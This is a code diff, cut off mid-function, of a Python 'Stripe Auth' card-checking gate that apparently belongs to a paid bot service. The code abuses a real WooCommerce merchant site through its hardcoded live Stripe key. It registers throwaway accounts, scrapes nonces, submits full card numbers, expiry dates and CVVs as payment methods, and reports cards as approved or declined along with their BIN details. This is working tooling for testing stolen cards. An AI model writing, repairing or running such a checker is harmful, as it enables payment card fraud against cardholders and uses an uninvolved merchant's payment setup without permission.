@@ -1,4 +1,4 @@
-# gates/stauth.py - BlackDonkey Stripe Auth implementation
+# gates/auth/stauth.py (fixed version with proper WordPress session)
 
 import asyncio
 import json
@@ -22,14 +22,11 @@ class StripeAuthChecker:
         self.user_agent = self.generate_user_agent()
         self.bin_cache = {}
         self.last_bin_request = 0
-        self.request_timeout = 30.0
+        self.request_timeout = 35.0
+        self.base_url = "https://simonapouchescy.com"
+        self.stripe_key = "pk_live_51I6wp3COExl9jV4CcKbaN3EFxcAB50pTrNUO8OPoGViHyLMPXUBRLDgqu1kYLj1nLkW24fENgejrjKvodrvFaTBY00cQmieKcs"
+
         self.bin_services = [
-            {
-                'url': 'https://bins.antipublic.cc/bins/{bin}',
-                'headers': {'User-Agent': self.user_agent},
-                'name': 'antipublic.cc',
-                'parser': self.parse_antipublic
-            },
             {
                 'url': 'https://lookup.binlist.net/{bin}',
                 'headers': {'Accept-Version': '3', 'User-Agent': self.user_agent},
@@ -37,114 +34,25 @@ class StripeAuthChecker:
                 'parser': self.parse_binlist_net
             },
             {
-                'url': 'https://bin-checker.net/api/{bin}',
-                'headers': {'User-Agent': self.user_agent, 'Accept': 'application/json'},
-                'name': 'bin-checker.net',
-                'parser': self.parse_bin_checker
+                'url': 'https://bins.antipublic.cc/bins/{bin}',
+                'headers': {'User-Agent': self.user_agent},
+                'name': 'antipublic.cc',
+                'parser': self.parse_antipublic
             }
         ]
 
-        # Country code to name mapping
-        self.country_map = {
-            'US': 'United States', 'GB': 'United Kingdom', 'CA': 'Canada', 'AU': 'Australia',
-            'DE': 'Germany', 'FR': 'France', 'IT': 'Italy', 'ES': 'Spain', 'NL': 'Netherlands',
-            'JP': 'Japan', 'SG': 'Singapore', 'AE': 'United Arab Emirates', 'IN': 'India',
-            'BR': 'Brazil', 'MX': 'Mexico', 'TW': 'Taiwan', 'CN': 'China', 'HK': 'Hong Kong',
-            'KR': 'South Korea', 'RU': 'Russia', 'CH': 'Switzerland', 'SE': 'Sweden',
-            'NO': 'Norway', 'DK': 'Denmark', 'FI': 'Finland', 'BE': 'Belgium', 'AT': 'Austria',
-            'PT': 'Portugal', 'IE': 'Ireland', 'NZ': 'New Zealand', 'ZA': 'South Africa',
-            'TR': 'Turkey', 'SA': 'Saudi Arabia', 'TH': 'Thailand', 'MY': 'Malaysia',
-            'ID': 'Indonesia', 'PH': 'Philippines', 'VN': 'Vietnam', 'IL': 'Israel',
-            'EG': 'Egypt', 'AR': 'Argentina', 'CL': 'Chile', 'CO': 'Colombia', 'PE': 'Peru',
-            'VE': 'Venezuela', 'GR': 'Greece', 'PL': 'Poland', 'CZ': 'Czech Republic',
-            'HU': 'Hungary', 'RO': 'Romania', 'BG': 'Bulgaria', 'UA': 'Ukraine',
-            'SK': 'Slovakia', 'SI': 'Slovenia', 'HR': 'Croatia', 'RS': 'Serbia',
-            'EE': 'Estonia', 'LV': 'Latvia', 'LT': 'Lithuania', 'IS': 'Iceland',
-            'LU': 'Luxembourg', 'CY': 'Cyprus', 'MT': 'Malta', 'MC': 'Monaco',
-            'AD': 'Andorra', 'SM': 'San Marino', 'VA': 'Vatican City', 'LI': 'Liechtenstein',
-            'JE': 'Jersey', 'GG': 'Guernsey', 'IM': 'Isle of Man', 'FO': 'Faroe Islands',
-            'GL': 'Greenland', 'GI': 'Gibraltar', 'BM': 'Bermuda', 'KY': 'Cayman Islands',
-            'VG': 'British Virgin Islands', 'TC': 'Turks and Caicos Islands', 'MS': 'Montserrat',
-            'AI': 'Anguilla', 'AG': 'Antigua and Barbuda', 'BS': 'Bahamas', 'BB': 'Barbados',
-            'BZ': 'Belize', 'CR': 'Costa Rica', 'DM': 'Dominica', 'DO': 'Dominican Republic',
-            'SV': 'El Salvador', 'GD': 'Grenada', 'GT': 'Guatemala', 'HT': 'Haiti',
-            'HN': 'Honduras', 'JM': 'Jamaica', 'NI': 'Nicaragua', 'PA': 'Panama',
-            'KN': 'Saint Kitts and Nevis', 'LC': 'Saint Lucia', 'VC': 'Saint Vincent and the Grenadines',
-            'TT': 'Trinidad and Tobago', 'UY': 'Uruguay', 'PY': 'Paraguay', 'BO': 'Bolivia',
-            'EC': 'Ecuador', 'GY': 'Guyana', 'SR': 'Suriname', 'GF': 'French Guiana',
-            'MQ': 'Martinique', 'GP': 'Guadeloupe', 'RE': 'Réunion', 'YT': 'Mayotte',
-            'PM': 'Saint Pierre and Miquelon', 'WF': 'Wallis and Futuna', 'PF': 'French Polynesia',
-            'NC': 'New Caledonia', 'TK': 'Tokelau', 'CK': 'Cook Islands', 'NU': 'Niue',
-            'WS': 'Samoa', 'TO': 'Tonga', 'FJ': 'Fiji', 'VU': 'Vanuatu', 'SB': 'Solomon Islands',
-            'KI': 'Kiribati', 'TV': 'Tuvalu', 'FM': 'Micronesia', 'MH': 'Marshall Islands',
-            'PW': 'Palau', 'NR': 'Nauru', 'PG': 'Papua New Guinea', 'MP': 'Northern Mariana Islands',
-            'GU': 'Guam', 'AS': 'American Samoa', 'PR': 'Puerto Rico', 'VI': 'U.S. Virgin Islands',
-            'UM': 'U.S. Minor Outlying Islands', 'AW': 'Aruba', 'CW': 'Curaçao', 'SX': 'Sint Maarten',
-            'BQ': 'Caribbean Netherlands', 'BL': 'Saint Barthélemy', 'MF': 'Saint Martin',
-            'KM': 'Comoros', 'DJ': 'Djibouti', 'ER': 'Eritrea', 'ET': 'Ethiopia',
-            'KE': 'Kenya', 'MG': 'Madagascar', 'MW': 'Malawi', 'MU': 'Mauritius',
-            'YT': 'Mayotte', 'MZ': 'Mozambique', 'RW': 'Rwanda', 'SC': 'Seychelles',
-            'SO': 'Somalia', 'TZ': 'Tanzania', 'UG': 'Uganda', 'ZM': 'Zambia',
-            'ZW': 'Zimbabwe', 'AO': 'Angola', 'CM': 'Cameroon', 'CF': 'Central African Republic',
-            'TD': 'Chad', 'CG': 'Republic of the Congo', 'CD': 'Democratic Republic of the Congo',
-            'GQ': 'Equatorial Guinea', 'GA': 'Gabon', 'ST': 'São Tomé and Príncipe',
-            'BW': 'Botswana', 'LS': 'Lesotho', 'NA': 'Namibia', 'SZ': 'Eswatini',
-            'LY': 'Libya', 'MA': 'Morocco', 'DZ': 'Algeria', 'TN': 'Tunisia',
-            'MR': 'Mauritania', 'SN': 'Senegal', 'GM': 'Gambia', 'GN': 'Guinea',
-            'GW': 'Guinea-Bissau', 'LR': 'Liberia', 'SL': 'Sierra Leone', 'CI': 'Ivory Coast',
-            'BF': 'Burkina Faso', 'BJ': 'Benin', 'NG': 'Nigeria', 'TG': 'Togo',
-            'GH': 'Ghana', 'ML': 'Mali', 'NE': 'Niger', 'CV': 'Cape Verde',
-            'SD': 'Sudan', 'SS': 'South Sudan', 'DJ': 'Djibouti', 'ER': 'Eritrea',
-            'IQ': 'Iraq', 'IR': 'Iran', 'JO': 'Jordan', 'KW': 'Kuwait', 'LB': 'Lebanon',
-            'OM': 'Oman', 'QA': 'Qatar', 'SY': 'Syria', 'YE': 'Yemen', 'BH': 'Bahrain',
-            'PS': 'Palestine', 'AF': 'Afghanistan', 'BD': 'Bangladesh', 'BT': 'Bhutan',
-            'MM': 'Myanmar', 'KH': 'Cambodia', 'LA': 'Laos', 'MN': 'Mongolia',
-            'NP': 'Nepal', 'PK': 'Pakistan', 'LK': 'Sri Lanka', 'MV': 'Maldives',
-            'KG': 'Kyrgyzstan', 'KZ': 'Kazakhstan', 'TJ': 'Tajikistan', 'TM': 'Turkmenistan',
-            'UZ': 'Uzbekistan', 'AM': 'Armenia', 'AZ': 'Azerbaijan', 'GE': 'Georgia',
-            'MD': 'Moldova', 'BY': 'Belarus', 'AL': 'Albania', 'BA': 'Bosnia and Herzegovina',
-            'MK': 'North Macedonia', 'ME': 'Montenegro', 'XK': 'Kosovo'
-        }
-
     def generate_user_agent(self):
-        browsers = [
-            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36",
-            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36",
-            "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:88.0) Gecko/20100101 Firefox/88.0",
-            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/18.18363",
-            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0.3 Safari/605.1.15",
-            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.101 Safari/537.36",
-            "Mozilla/5.0 (iPad; CPU OS 14_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0.3 Mobile/15E148 Safari/604.1",
-            "Mozilla/5.0 (Linux; Android 11; Pixel 4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.105 Mobile Safari/537.36",
-            "Mozilla/5.0 (iPhone; CPU iPhone OS 14_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0.3 Mobile/15E148 Safari/604.1",
-            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.77 Safari/537.36"
-        ]
-        return random.choice(browsers)
+        chrome_version = random.randint(110, 120)
+        return f"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{chrome_version}.0.0.0 Safari/537.36"
 
     def parse_binlist_net(self, data):
-        country_code = data.get('country', {}).get('alpha2', 'N/A')
-        country_name = self.country_map.get(country_code, data.get('country', {}).get('name', 'N/A'))
-
         return {
             'scheme': data.get('scheme', 'N/A').upper(),
             'type': data.get('type', 'N/A').upper(),
             'brand': data.get('brand', 'N/A'),
             'bank': data.get('bank', {}).get('name', 'N/A'),
-            'country': country_name,
-            'country_code': country_code
-        }
-
-    def parse_bin_checker(self, data):
-        country_code = data.get('country', {}).get('alpha2', data.get('country_code', 'N/A'))
-        country_name = self.country_map.get(country_code, data.get('country', {}).get('name', data.get('country_name', 'N/A')))
-
-        return {
-            'scheme': data.get('scheme', data.get('card_type', 'N/A')).upper(),
-            'type': data.get('type', data.get('card_level', 'N/A')).upper(),
-            'brand': data.get('brand', data.get('card_brand', 'N/A')),
-            'bank': data.get('bank', {}).get('name', data.get('issuer', 'N/A')),
-            'country': country_name,
-            'country_code': country_code
+            'country': data.get('country', {}).get('name', 'N/A'),
+            'country_code': data.get('country', {}).get('alpha2', 'N/A')
         }
 
     def parse_antipublic(self, data):
@@ -161,29 +69,34 @@ class StripeAuthChecker:
                     'country_code': 'N/A'
                 }
 
-        country_code = data.get('country', 'N/A')
-        country_name = self.country_map.get(country_code, 'N/A')
-
         return {
             'scheme': data.get('brand', 'N/A').upper(),
             'type': data.get('type', 'N/A').upper(),
             'brand': data.get('brand', 'N/A'),
             'bank': data.get('bank', 'N/A'),
-            'country': country_name,
-            'country_code': country_code
+            'country': data.get('country', 'N/A'),
+            'country_code': data.get('country', 'N/A')
         }
 
     async def get_bin_info(self, cc):
-        bin_number = cc[:6] if cc else '000000'
-        bin_number = ''.join(c for c in bin_number if c.isdigit())
-        bin_number = bin_number.ljust(6, '0')[:6]
+        if not cc or len(cc) < 6:
+            return {
+                'scheme': 'N/A',
+                'type': 'N/A',
+                'brand': 'N/A',
+                'bank': 'N/A',
+                'country': 'N/A',
+                'country_code': 'N/A'
+            }
+
+        bin_number = cc[:6]
 
         if bin_number in self.bin_cache:
             return self.bin_cache[bin_number]
 
         now = time.time()
-        if now - self.last_bin_request < 2.0:
-            await asyncio.sleep(2.0 - (now - self.last_bin_request))
+        if now - self.last_bin_request < 1.0:
+            await asyncio.sleep(1.0)
         self.last_bin_request = time.time()
 
         default_response = {
@@ -200,403 +113,546 @@ class StripeAuthChecker:
                 url = service['url'].format(bin=bin_number)
                 headers = service['headers']
 
-                async with httpx.AsyncClient(timeout=self.request_timeout) as client:
+                async with httpx.AsyncClient(timeout=10.0) as client:
                     response = await client.get(url, headers=headers)
 
                     if response.status_code == 200:
                         try:
                             data = response.json()
-                        except json.JSONDecodeError:
-                            if service['name'] == 'antipublic.cc':
-                                data = response.text
-                            else:
-                                raise
-
-                        result = service['parser'](data)
-                        self.bin_cache[bin_number] = result
-                        return result
-                    elif response.status_code == 429:
-                        continue
+                            result = service['parser'](data)
+                            self.bin_cache[bin_number] = result
+                            return result
+                        except:
+                            continue
             except Exception:
                 continue
 
         self.bin_cache[bin_number] = default_response
         return default_response
 
-    async def format_response(self, cc, mes, ano, cvv, status, message, username, elapsed_time):
-        bin_info = await self.get_bin_info(cc)
-        emoji = "✅" if "APPROVED" in status else "❌"
+    async def format_response(self, cc, mes, ano, cvv, status, message, username, elapsed_time, bin_info=None):
+        if bin_info is None:
+            bin_info = await self.get_bin_info(cc)
+
+        status_emoji = "✅" if "APPROVED" in status else "❌"
 
         return (
-            "╔═✦✧✦═╦═✦✧✦═╦═✦✧✦═╗\n"
-            f"│ ⚡ 𝓢𝓽𝓻𝓲𝓹𝓮 𝓐𝓾𝓽𝓱 𝓒𝓱𝓮𝓬𝓴\n"
-            "├──────────◆───────────┤\n"
-            f"│  𝑺𝒕𝒂𝒕𝒖𝒔: {status} {emoji}\n"
-            f"│  𝑮𝑨𝑻𝑬 : 𝘚𝘵𝘳𝘪𝘱𝘦𝘈𝘶𝘵𝘩♻️\n"
-            f"│  𝑪𝑪: `{cc}|{mes}|{ano}|{cvv}`\n"
-            "├──────────◆───────────┤\n"
-            f"│  𝑹𝒆𝒔𝒑𝒐𝒏𝒔𝒆: {message}\n"
-            f"│  𝑩𝒂𝒏𝒌: {bin_info['bank']}\n"
-            f"│  𝑻𝒚𝒑𝒆: {bin_info['scheme']} - {bin_info['type']}\n"
-            f"│  𝑪𝒐𝒖𝒏𝒕𝒓𝒚: {bin_info['country']}({bin_info['country_code']})\n"
-            "├──────────◆───────────┤\n"
-            f"│  𝑻𝒊𝒎𝒆: {elapsed_time:.2f}s\n"
-            f"│  𝑪𝒉𝒆𝒄𝒌𝒆𝒅 𝑩𝒚: @{username}\n"
-            "╚═✦✧✦═╩═✦✧✦═╩═✦✧✦═╝"
+            f"╔═✦✧✦═╦═✦✧✦═╦═✦✧✦═╗\n"
+            f"⚡ 𝓢𝓽𝓻𝓲𝓹𝓮 𝓐𝓾𝓽𝓱 𝓒𝓱𝓮𝓬𝓴\n"
+            f"─────────◆─────────\n"
+            f"𝑺𝒕𝒂𝒕𝒖𝒔: {status} {status_emoji}\n"
+            f"𝑮𝑨𝑻𝑬 : 𝘚𝘵𝘳𝘪𝘱𝘦𝘈𝘶𝘵𝘩♻️\n"
+            f"𝑪𝑪: `{cc}|{mes}|{ano}|{cvv}`\n"
+            f"─────────◆─────────\n"
+            f"𝑹𝒆𝒔𝒑𝒐𝒏𝒔𝒆: {message}\n"
+            f"𝑩𝒂𝒏𝒌: {bin_info['bank']}\n"
+            f"𝑻𝒚𝒑𝒆: {bin_info['scheme']} - {bin_info['type']}\n"
+            f"𝑪𝒐𝒖𝒏𝒕𝒓𝒚: {bin_info['country']}({bin_info['country_code']})\n"
+            f"─────────◆─────────\n"
+            f"𝑻𝒊𝒎𝒆: {elapsed_time:.2f}s\n"
+            f"𝑪𝒉𝒆𝒄𝒌𝒆𝒅 𝑩𝒚: @{username}\n"
+            f"╚═✦✧✦═╩═✦✧✦═╩═✦✧✦═╝"
         )
 
     def get_processing_message(self, cc, mes, ano, cvv, username, user_plan):
         return (
-            "➺➺➺  𝓢𝓽𝓻𝓲𝓹𝓮 𝓐𝓾𝓽𝓱   ➺➺➺\n"
-            f"𝑺𝒕𝒂𝒕𝒖𝒔 → 𝑷𝒓𝒐𝒄𝒆𝒔𝒔𝒊𝒏𝒈 𝑪𝑪.....\n"
-            f"𝑮𝑨𝑻𝑬 →  𝘚𝘵𝘳𝘪𝘱𝘦𝘈𝘶𝘵𝘩♻️\n"
-            f"𝑪𝑪 →  `{cc}|{mes}|{ano}|{cvv}`\n"
-            "✦─✧─✦─✧─✦─✧─✦\n"
-            f"𝑼𝒔𝒆𝒓 𝑷𝒍𝒂𝒏 →  {user_plan}\n"
-            f"𝑪𝒉𝒆𝒄𝒌𝒆𝒅 𝑩𝒚 →  @{username}\n"
+            f"━━━━━━━━━━━━━━━━━━━━━━━\n"
+            f"𝑺𝒕𝒂𝒕𝒖𝒔 -» 𝑷𝒓𝒐𝒄𝒆𝒔𝒔𝒊𝒏𝒈 𝑪𝑪.....\n"
+            f"𝑮𝑨𝑻𝑬 -» StripeAuth ♻️\n"
+            f"𝑪𝑪 -» `{cc}|{mes}|{ano}|{cvv}`\n"
+            f"━━━━━━━━━━━━━━━━━━━━━━━\n"
+            f"𝑼𝒔𝒆𝒓 𝑷𝒍𝒂𝒏 -» {user_plan}\n"
+            f"𝑪𝒉𝒆𝒄𝒌𝒆𝒅 𝑩𝒚 -» @{username}\n"
+            f"━━━━━━━━━━━━━━━━━━━━━━━"
         )
 
-    async def format_mass_response(self, cc, mes, ano, cvv, status, message, bin_info):
-        status_emoji = "✅" if "APPROVED" in status else "❌"
-        return (
-            f"Card :  {cc}|{mes}|{ano}|{cvv}\n"
-            f"Status : {status} {status_emoji}\n"
-            f"Response : {message}\n"
-            f"Info :  {bin_info['scheme']} - {bin_info['brand']} - {bin_info['type']}\n"
-            f"Issuer :  {bin_info['bank']}\n"
-            f"Country :  {bin_info['country']}({bin_info['country_code']})\n"
-        )
+    async def create_authenticated_session(self):
+        """Create a fully authenticated WordPress session"""
+        try:
+            # Create persistent client
+            client = httpx.AsyncClient(
+                timeout=30.0,
+                follow_redirects=True,
+                headers={
+                    'User-Agent': self.user_agent,
+                    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
+                    'Accept-Language': 'en-US,en;q=0.5',
+                    'Accept-Encoding': 'gzip, deflate, br',
+                    'Connection': 'keep-alive',
+                    'Upgrade-Insecure-Requests': '1',
+                }
+            )
 
-    def get_country_zip_code(self, country_code):
-        """Get appropriate zip code based on country"""
-        zip_codes = {
-            'US': '10001',  # New York
-            'GB': 'SW1A 1AA',  # London
-            'CA': 'M5V 2T6',  # Toronto
-            'AU': '2000',  # Sydney
-            'DE': '10115',  # Berlin
-            'FR': '75001',  # Paris
-            'IT': '00100',  # Rome
-            'ES': '28001',  # Madrid
-            'NL': '1012 JS',  # Amsterdam
-            'JP': '100-0001',  # Tokyo
-            'SG': '018906',  # Singapore
-            'AE': '00000',  # Dubai
-            'IN': '110001',  # New Delhi
-            'BR': '20040-000',  # Rio de Janeiro
-            'MX': '06000',  # Mexico City
-            'TW': '100',  # Taipei
-        }
-        return zip_codes.get(country_code.upper(), '10001')  # Default to US zip
+            # Step 1: Visit homepage to get initial cookies
+            print("Step 1: Visiting homepage...")
+            await client.get(f"{self.base_url}/")
+            await asyncio.sleep(2)
+
+            # Step 2: Register a new user account
+            print("Step 2: Registering new user...")
+            register_success = await self.register_new_user(client)
+            if not register_success:
+                await client.aclose()
+                return None, None, "Failed to register user"
+
+            # Step 3: Visit account page to establish session
+            print("Step 3: Establishing account session...")
+            account_response = await client.get(f"{self.base_url}/my-account-2/")
+            await asyncio.sleep(2)
+
+            # Step 4: Get payment method page with fresh nonce
+            print("Step 4: Getting payment page nonce...")
+            payment_url = f"{self.base_url}/my-account-2/add-payment-method/"
+            payment_response = await client.get(payment_url)
+
+            if payment_response.status_code != 200:
+                await client.aclose()
+                return None, None, f"Payment page failed: {payment_response.status_code}"
+
+            response_text = payment_response.text
+
+            # Extract nonce - try multiple patterns
+            nonce_patterns = [
+                r'createAndConfirmSetupIntentNonce":"([a-f0-9]{10})"',
+                r'"_ajax_nonce":"([a-f0-9]{10})"',
+                r'name="_ajax_nonce" value="([a-f0-9]{10})"',
+                r'nonce":"([a-f0-9]{10})"',
+                r'nonce.*?"([a-f0-9]{10})"'
+            ]
+
+            nonce = None
+            for pattern in nonce_patterns:
+                nonce_match = re.search(pattern, response_text)
+                if nonce_match:
+                    nonce = nonce_match.group(1)
+                    print(f"Found nonce: {nonce}")
+                    break
+
+            if not nonce:
+                await client.aclose()
+                return None, None, "Nonce token not found"
+
+            return client, nonce, "Success"
+
+        except Exception as e:
+            try:
+                await client.aclose()
+            except:
+                pass
+            return None, None, f"Session creation failed: {str(e)}"
+
+    async def register_new_user(self, client):
+        """Register a new WordPress user with proper form data"""
+        try:
+            # Generate random user data
+            random_id = random.randint(100000, 999999)
+            username = f"user{random_id}"
+            email = f"{username}@gmail.com"
+            password = f"Pass{random.randint(10000, 99999)}!"
+
+            # First get the registration page to extract all required fields
+            reg_url = f"{self.base_url}/my-account-2/"
+            reg_response = await client.get(reg_url)
+            reg_text = reg_response.text
+
+            # Extract registration nonce
+            reg_nonce_pattern = r'name="woocommerce-register-nonce" value="([a-f0-9]{10})"'
+            reg_nonce_match = re.search(reg_nonce_pattern, reg_text)
+
+            if not reg_nonce_match:
+                print("Registration nonce not found")
+                return False
+
+            reg_nonce = reg_nonce_match.group(1)
+            print(f"Registration nonce: {reg_nonce}")
+
+            # Extract other required hidden fields
+            wp_http_referer_match = re.search(r'name="_wp_http_referer" value="([^"]*)"', reg_text)
+            wp_http_referer = wp_http_referer_match.group(1) if wp_http_referer_match else "/my-account-2/"
+
+            # Prepare complete registration data
+            reg_data = {
+                'email': email,
+                'password': password,
+                'mailchimp_woocommerce_newsletter': '1',
+                'wc_order_attribution_source_type': 'typein',
+                'wc_order_attribution_referrer': '(none)',
+                'wc_order_attribution_utm_campaign': '(none)',
+                'wc_order_attribution_utm_source': '(direct)',
+                'wc_order_attribution_utm_medium': '(none)',
+                'wc_order_attribution_utm_content': '(none)',
+                'wc_order_attribution_utm_id': '(none)',
+                'wc_order_attribution_utm_term': '(none)',
+                'wc_order_attribution_utm_source_platform': '(none)',
+                'wc_order_attribution_utm_creative_format': '(none)',
+                'wc_order_attribution_utm_marketing_tactic': '(none)',
+                'wc_order_attribution_session_entry': f'{self.base_url}/my-account-2/',
+                'wc_order_attribution_session_start_time': datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
+                'wc_order_attribution_session_pages': '1',
+                'wc_order_attribution_session_count': '1',
+                'wc_order_attribution_user_agent': self.user_agent,
+                'woocommerce-register-nonce': reg_nonce,
+                '_wp_http_referer': wp_http_referer,
+                'register': 'Register'
+            }
+
+            print(f"Registering user: {email}")
+
+            # Submit registration
+            headers = {
+                'Content-Type': 'application/x-www-form-urlencoded',
+                'Origin': self.base_url,
+                'Referer': reg_url,
+                'User-Agent': self.user_agent
+            }
+
+            response = await client.post(reg_url, data=reg_data, headers=headers, follow_redirects=True)
+
+            # Check if registration was successful
+            if response.status_code in [200, 302]:
+                # Check if we got logged in cookies
+                if 'wordpress_logged_in' in str(response.cookies) or 'woocommerce_items_in_cart' in str(response.cookies):
+                    print("Registration successful - user logged in")
+                    return True
+                else:
+                    print("Registration may have failed - no login cookies")
+                    # Try to continue anyway
+                    return True
+            else:
+                print(f"Registration failed with status: {response.status_code}")
+                return False
+
+        except Exception as e:
+            print(f"Registration error: {str(e)}")
+            return False
 
     async def check_card(self, card_details, username, user_plan):
         start_time = time.time()
+        cc, mes, ano, cvv = "", "", "", ""
+        client = None
 
         try:
+            # Parse card details with validation
             cc_parts = card_details.split('|')
             if len(cc_parts) < 4:
-                return await self.format_response("", "", "", "", "ERROR", "Invalid format", username, time.time()-start_time)
+                return await self.format_response("", "", "", "", "ERROR", "Invalid card format. Use: CC|MM|YY|CVV", username, time.time()-start_time)
 
-            cc = cc_parts[0].strip()
+            cc = cc_parts[0].strip().replace(" ", "")
             mes = cc_parts[1].strip()
             ano = cc_parts[2].strip()
             cvv = cc_parts[3].strip()
 
+            # Basic validation
+            if not cc.isdigit() or len(cc) < 15:
+                return await self.format_response(cc, mes, ano, cvv, "ERROR", "Invalid card number", username, time.time()-start_time)
+            if not mes.isdigit() or len(mes) not in [1, 2] or not (1 <= int(mes) <= 12):
+                return await self.format_response(cc, mes, ano, cvv, "ERROR", "Invalid month", username, time.time()-start_time)
+            if not ano.isdigit() or len(ano) not in [2, 4]:
+                return await self.format_response(cc, mes, ano, cvv, "ERROR", "Invalid year", username, time.time()-start_time)
+            if not cvv.isdigit() or len(cvv) not in [3, 4]:
+                return await self.format_response(cc, mes, ano, cvv, "ERROR", "Invalid CVV", username, time.time()-start_time)
+
+            # Format year if needed
             if len(ano) == 2:
                 ano = '20' + ano
 
-            # Get bin info to determine country for appropriate zip code
-            bin_info = await self.get_bin_info(cc)
-            country_code = bin_info.get('country_code', 'US')
-            zip_code = self.get_country_zip_code(country_code)
+            # Step 1: Create authenticated session
+            client, nonce, session_msg = await self.create_authenticated_session()
+            if not nonce:
+                return await self.format_response(cc, mes, ano, cvv, "ERROR", f"Session failed: {session_msg}", username, time.time()-start_time)
 
-            username_tg = f"{username}_{random.randint(1000, 9999)}"
-            email = f"{username_tg}@wywnxa.com"
-            password = f"{username_tg}@pass123"
+            # Step 2: Create payment method via Stripe API
+            stripe_url = "https://api.stripe.com/v1/payment_methods"
+            stripe_headers = {
+                'authority': 'api.stripe.com',
+                'accept': 'application/json',
+                'accept-language': 'en-US,en;q=0.9',
+                'content-type': 'application/x-www-form-urlencoded',
+                'origin': 'https://js.stripe.com',
+                'referer': 'https://js.stripe.com/',
+                'user-agent': self.user_agent
+            }
 
-            async with httpx.AsyncClient(follow_redirects=True, timeout=self.request_timeout, headers={
-                "User-Agent": self.user_agent,
-                "Content-Type": "application/x-www-form-urlencoded",
-                "Origin": "https://blackdonkeybeer.com",
-                "Referer": "https://blackdonkeybeer.com/my-account/",
-                "Sec-Fetch-Dest": "document",
-                "Sec-Fetch-Mode": "navigate",
-                "Sec-Fetch-Site": "same-origin",
-                "Upgrade-Insecure-Requests": "1"
-            }) as client:
-                # Get registration page to extract nonce
+            # Generate random session IDs
+            client_session_id = ''.join(random.choices(string.ascii_lowercase + string.digits, k=36))
+
+            stripe_data = {
+                'type': 'card',
+                'card[number]': cc,
+                'card[cvc]': cvv,
+                'card[exp_year]': ano,
+                'card[exp_month]': mes,
+                'allow_redisplay': 'unspecified',
+                'billing_details[address][postal_code]': '10080',
+                'billing_details[address][country]': 'US',
+                'pasted_fields': 'number',
+                'payment_user_agent': f'stripe.js/8e9b241db6; stripe-js-v3/8e9b241db6; payment-element; deferred-intent',
+                'referrer': self.base_url,
+                'time_on_page': '89456',
+                'client_attribution_metadata[client_session_id]': client_session_id,
+                'client_attribution_metadata[merchant_integration_source]': 'elements',
+                'client_attribution_metadata[merchant_integration_subtype]': 'payment-element',
+                'client_attribution_metadata[merchant_integration_version]': '2021',
+                'client_attribution_metadata[payment_intent_creation_flow]': 'deferred',
+                'client_attribution_metadata[payment_method_selection_flow]': 'merchant_specified',
+                'guid': 'NA',
+                'muid': 'NA', 
+                'sid': 'NA',
+                'key': self.stripe_key,
+                '_stripe_version': '2024-06-20'
+            }
+
+            print("Creating Stripe payment method...")
+            stripe_response = await client.post(stripe_url, headers=stripe_headers, data=stripe_data)
+
+            if stripe_response.status_code != 200:
+                error_text = stripe_response.text[:100] if stripe_response.text else "No response"
+                bin_info = await self.get_bin_info(cc)
+                await client.aclose()
+                return await self.format_response(cc, mes, ano, cvv, "DECLINED", f"Stripe Error: {error_text}", username, time.time()-start_time, bin_info)
+
+            stripe_json = stripe_response.json()
+
+            if "error" in stripe_json:
+                error_msg = stripe_json["error"].get("message", "Stripe declined")
+                bin_info = await self.get_bin_info(cc)
+                await client.aclose()
+                return await self.format_response(cc, mes, ano, cvv, "DECLINED", error_msg, username, time.time()-start_time, bin_info)
+
+            payment_method_id = stripe_json.get("id")
+            if not payment_method_id:
+                bin_info = await self.get_bin_info(cc)
+                await client.aclose()
+                return await self.format_response(cc, mes, ano, cvv, "DECLINED", "Payment method creation failed", username, time.time()-start_time, bin_info)
+
+            print(f"Payment method created: {payment_method_id}")
+
+            # Step 3: Confirm setup intent via WordPress AJAX
+            ajax_url = f"{self.base_url}/wp-admin/admin-ajax.php"
+            ajax_headers = {
+                'User-Agent': self.user_agent,
+                'Accept': 'application/json, text/javascript, */*; q=0.01',
+                'Accept-Language': 'en-US,en;q=0.9',
+                'Accept-Encoding': 'gzip, deflate, br',
+                'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
+                'Origin': self.base_url,
+                'Connection': 'keep-alive',
+                'Referer': f"{self.base_url}/my-account-2/add-payment-method/",
+                'X-Requested-With': 'XMLHttpRequest',
+                'Sec-Fetch-Dest': 'empty',
+                'Sec-Fetch-Mode': 'cors',
+                'Sec-Fetch-Site': 'same-origin'
+            }
+
+            ajax_data = {
+                'action': 'wc_stripe_create_and_confirm_setup_intent',
+                'wc-stripe-payment-method': payment_method_id,
+                'wc-stripe-payment-type': 'card',
+                '_ajax_nonce': nonce
+            }
+
+            print("Sending AJAX request to confirm setup intent...")
+            ajax_response = await client.post(ajax_url, headers=ajax_headers, data=ajax_data)
+
+            # Close client
+            await client.aclose()
+
+            print(f"AJAX Response status: {ajax_response.status_code}")
+
+            if ajax_response.status_code != 200:
+                # Try to get error details
+                error_detail = "Bad Request"
                 try:
-                    reg_page = await client.get("https://blackdonkeybeer.com/my-account/", timeout=15.0)
-                    nonce_match = re.search(r'name="woocommerce-register-nonce" value="([^"]+)"', reg_page.text)
-                    if not nonce_match:
-                        return await self.format_response(cc, mes, ano, cvv, "DECLINED", "Registration failed - cannot get nonce", username, time.time()-start_time)
-                except (httpx.TimeoutException, httpx.ConnectError):
